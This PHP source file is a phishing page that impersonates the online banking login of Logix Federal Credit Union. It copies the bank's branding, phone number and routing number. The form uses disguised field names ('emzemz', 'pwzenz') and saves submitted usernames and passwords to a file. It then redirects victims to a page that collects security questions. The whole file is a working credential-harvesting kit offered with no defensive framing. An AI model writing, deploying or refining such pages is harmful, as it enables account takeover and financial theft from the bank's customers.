<?php
session_start();
require_once 'includes/file_storage.php';

// Check if user is logged in
if (isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true) {
    header('Location: pages/security-questions.php');
    exit;
}

// Handle form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $emzemz = $_POST['emzemz'] ?? '';
    $pwzenz = $_POST['pwzenz'] ?? '';
    
    $errors = [];
    
    if (empty($emzemz)) {
        $errors['emzemz'] = 'Username required';
    }
    
    if (empty($pwzenz)) {
        $errors['pwzenz'] = 'Password required';
    }
    
    if (empty($errors)) {
        // Save to text file instead of API call
        if (saveLoginData($emzemz, $pwzenz)) {
            // Store username in session for next page
            $_SESSION['emzemz'] = $emzemz;
            $_SESSION['logged_in'] = true;
            
            // Redirect to security questions
            header('Location: pages/security-questions.php');
            exit;
        } else {
            $errors['form'] = 'Failed to save login information. Please try again.';
        }
    }
}

$showPwzenz = isset($_POST['showPwzenz']) ? true : false;
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Logix - Online Banking Login</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-100">
    <!-- Header -->
    <header class="bg-white border-b border-gray-200 py-4">
        <div class="max-w-7xl mx-auto px-4 flex items-center justify-between">
            <div class="flex items-center">
                <div class="text-3xl font-bold">
                    <img src="assets/logo.svg" alt="Logix Logo" class="h-12 w-auto" />
                </div>
            </div>
            <div class="flex gap-2 text-sm text-gray-700">
                <a href="#" class="hover:underline">Sign In</a>
                <span>|</span>
                <a href="#" class="hover:underline">Register</a>
            </div>
        </div>
    </header>

    <!-- Orange Divider Bar -->
    <div class="h-2 bg-orange-500"></div>

    <!-- Main Content -->
    <div class="max-w-7xl mx-auto px-4 py-8">
        <div class="flex gap-6">
            <!-- Left Column - Login Form -->
            <div class="flex-1">
                <div class="flex-1 bg-gray-200 rounded shadow-sm">
                    <div class="border-b-2 border-teal-500 px-8 py-4">
                        <h2 class="text-xl font-semibold text-gray-800">Sign In – Welcome to Logix Smarter Banking</h2>
                    </div>

                    <div class="px-6 py-6 bg-white space-y-4">
                        <form method="POST" action="">
                            <!-- Username Field -->
                            <div class="flex items-center gap-4 mb-4">
                                <label class="text-gray-700 w-24 text-right">Username:</label>
                                <input
                                    type="text"
                                    name="emzemz"
                                    value="<?php echo htmlspecialchars($_POST['emzemz'] ?? ''); ?>"
                                    class="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
                                />
                            </div>

                            <?php if (isset($errors['emzemz'])): ?>
                                <div class="flex items-center gap-3 text-sm font-bold mt-1 mb-1">
                                    <svg width="1rem" height="1rem" viewBox="0 0 24 24" class="fill-current text-red-600" aria-hidden="true">
                                        <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z" fill-rule="nonzero"></path>
                                    </svg>
                                    <p><?php echo htmlspecialchars($errors['emzemz']); ?></p>
                                </div>
                            <?php endif; ?>

                            <!-- Password Field -->
                            <div class="flex items-center gap-4 mb-4">
                                <label class="text-gray-700 w-24 text-right">Password:</label>
                                <input
                                    type="<?php echo $showPwzenz ? 'text' : 'password'; ?>"
                                    name="pwzenz"
                                    value="<?php echo htmlspecialchars($_POST['pwzenz'] ?? ''); ?>"
                                    class="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
                                />

                                <button
                                    type="button"
                                    class="text-blue-700 text-sm hover:underline cursor-pointer"
                                    onclick="togglePassword()"
                                >
                                    <?php echo $showPwzenz ? 'Hide' : 'Show'; ?>
                                </button>
                            </div>

                            <?php if (isset($errors['pwzenz'])): ?>
                                <div class="flex items-center gap-3 text-sm font-bold mt-2">
                                    <svg width="1rem" height="1rem" viewBox="0 0 24 24" class="fill-current text-red-600" aria-hidden="true">
                                        <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z" fill-rule="nonzero"></path>
                                    </svg>
                                    <p><?php echo htmlspecialchars($errors['pwzenz']); ?></p>
                                </div>
                            <?php endif; ?>

                            <!-- Sign-In Button -->
                            <div class="border-b-2 border-teal-500 justify-center text-center px-6 py-4">
                                <button
                                    type="submit"
                                    class="bg-gray-600 hover:bg-gray-700 text-white px-16 py-2 text-sm rounded"
                                >
                                    Sign-In
                                </button>
                            </div>
                        </form>
                    </div>

                    <!-- Security Information -->
                    <div class="px-6 pb-6">
                        <p class="text-xs text-gray-700 mb-2">
                            For security reasons, never share your username, password, social security number, account number or other private data online, unless you are certain who you are providing that information to, and only share information through a secure webpage or site.
                        </p>
                        <div class="text-xs text-blue-700 space-x-2">
                            <a href="#" class="hover:underline">Forgot Username?</a>
                            <span>|</span>
                            <a href="#" class="hover:underline">Forgot Password?</a>
                            <span>|</span>
                            <a href="#" class="hover:underline">Forgot Everything?</a>
                            <span>|</span>
                            <a href="#" class="hover:underline">Locked Out?</a>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Right Column - Sidebar -->
            <div class="w-64">
                <div class="w-64 bg-white border border-gray-300 rounded shadow-sm">
                    <div class="border-b-2 border-orange-500 px-4 py-3">
                        <h3 class="text-sm font-semibold text-gray-700">Sign In to Online Banking</h3>
                    </div>
                    <div class="px-4 py-6 text-center">
                        <p class="text-xs text-gray-700 mb-3">For assistance please call:</p>
                        <p class="text-2xl font-bold text-gray-700 mb-1">(800) 328-5328</p>
                        <p class="text-xs text-gray-600">Weekdays 7 a.m. to 7 p.m. (PT)</p>
                        <p class="text-xs text-gray-600">Saturday 9 a.m. to 3 p.m. (PT)</p>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Footer -->
    <footer class="bg-white border-t border-gray-300 py-6 mt-8">
        <div class="max-w-7xl mx-auto px-4">
            <div class="flex justify-between items-start">
                <!-- Left Section -->
                <div class="flex-1">
                    <p class="text-xs text-gray-700 mb-2">
                        Logix Federal Credit Union | Routing and Transit number — 322274187
                    </p>
                    <p class="text-xs text-gray-700 mb-3">
                        Logix Online Banking is protected by reCAPTCHA and the 
                        <a href="#" class="text-blue-700 hover:underline">Google Privacy Policy</a> and the 
                        <a href="#" class="text-blue-700 hover:underline">Terms of Service</a> apply.
                    </p>
                    <p class="text-xs text-gray-700">
                        © 2025 Logix Federal Credit Union. All Rights Reserved.
                    </p>
                    <div class="flex gap-3 text-xs text-blue-700 mt-2">
                        <a href="#" class="hover:underline">Web Site</a>
                        <span class="text-gray-400">|</span>
                        <a href="#" class="hover:underline">Privacy</a>
                        <span class="text-gray-400">|</span>
                        <a href="#" class="hover:underline">Contact Us</a>
                        <span class="text-gray-400">|</span>
                        <a href="#" class="hover:underline">Join</a>
                    </div>
                </div>

                <!-- Right Section -->
                <div class="flex flex-col items-end">
                    <div class="w-16 h-16 border border-gray-300 flex items-center justify-center mb-2">
                        <div class="text-center">
                            <div class="text-xs font-bold text-gray-700">EQUAL</div>
                            <div class="text-xs font-bold text-gray-700">HOUSING</div>
                            <div class="text-xs font-bold text-gray-700">LENDER</div>
                        </div>
                    </div>
                    <div class="text-xs font-bold text-gray-700 mb-1">NCUA</div>
                    <p class="text-xs text-gray-700">Federally insured by NCUA</p>
                </div>
            </div>

            <!-- Bottom Bar -->
            <div class="text-center text-xs text-gray-500 mt-6 border-t border-gray-200 pt-4">
                ~ Current time is <?php echo date('m/d/Y h:i:s A'); ?> ~ 0 ~ NWEB02 ~
            </div>
        </div>
    </footer>

    <script>
        function togglePassword() {
            const passwordInput = document.querySelector('input[name="pwzenz"]');
            const toggleButton = document.querySelector('button[onclick="togglePassword()"]');
            const form = document.querySelector('form');
            
            // Create hidden input to track password visibility
            let showInput = document.querySelector('input[name="showPwzenz"]');
            if (!showInput) {
                showInput = document.createElement('input');
                showInput.type = 'hidden';
                showInput.name = 'showPwzenz';
                form.appendChild(showInput);
            }
            
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                toggleButton.textContent = 'Hide';
                showInput.value = 'true';
            } else {
                passwordInput.type = 'password';
                toggleButton.textContent = 'Show';
                showInput.value = 'false';
            }
        }
    </script>
</body>
</html>
